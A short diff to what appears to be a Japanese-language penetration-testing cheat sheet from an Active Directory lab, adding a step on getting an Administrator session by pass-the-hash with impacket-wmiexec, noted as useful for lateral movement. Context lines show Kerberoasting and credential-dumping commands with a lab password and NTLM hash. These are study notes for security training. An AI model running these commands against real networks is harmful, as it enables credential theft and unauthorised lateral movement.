@@ -44,3 +44,8 @@ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 ```
 impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
 ```
+
+7. impacketを使ってNTLMハッシュでAdministratorユーザとしてセッションをとる。横展開で使える。
+```
+/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.209.73
+```
